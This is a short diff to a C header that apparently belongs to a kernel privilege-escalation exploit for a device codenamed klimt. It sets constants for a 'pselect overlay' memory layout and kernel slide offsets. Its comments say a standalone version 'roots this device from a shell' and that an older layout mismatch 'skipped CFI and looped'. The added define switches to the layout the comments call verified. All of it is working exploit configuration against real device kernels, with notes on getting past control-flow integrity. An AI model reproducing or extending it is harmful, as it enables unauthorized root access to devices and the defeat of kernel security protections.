@@ -105,13 +105,20 @@
 #define SLIDE_SYSCTL_BOOTID_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
 
 /* ---------------------------------------------------- pselect overlay ------
- * Not QEMU-verified for this kernel. Using shift=-2 based on the working
- * dali-based exploit (SIMPLE_LAYOUT maps task→ex[0]=global 10, matching
- * core66 waiter word 12 + shift -2 = global 10).
+ * klimt uses SIMPLE_LAYOUT (matching the standalone exploit/ klimt-BP2A target
+ * that roots this device from a shell): in[0]=fake_w0, ex[0]=task, ex[1]=lock,
+ * ex[2]=wake_state=3. The standalone build reaches ret=9 with this layout,
+ * so it is the verified one for this kernel's stack frame.
+ *
+ * The shift layout (waiter_word 2-14 + PSELECT_WAITER_WORD_SHIFT) was inherited
+ * from pmg110/dali and produced ret=8 on klimt — a one-word layout mismatch
+ * that skipped CFI and looped. PSELECT_WAITER_WORD_SHIFT is kept for builds
+ * that still reference it but is not used while PSELECT_USE_SIMPLE_LAYOUT=1.
  *
  * SLIDE_PSELECT_WORD_SHIFT=0 inherited from pmg110; needs verification
  * if the slide route is used through this target header.
  */
+#define PSELECT_USE_SIMPLE_LAYOUT 1
 #define PSELECT_WAITER_WORD_SHIFT -2
 #define SLIDE_PSELECT_WORD_SHIFT 0
 #define SLIDE_PSELECT_NFDS 320
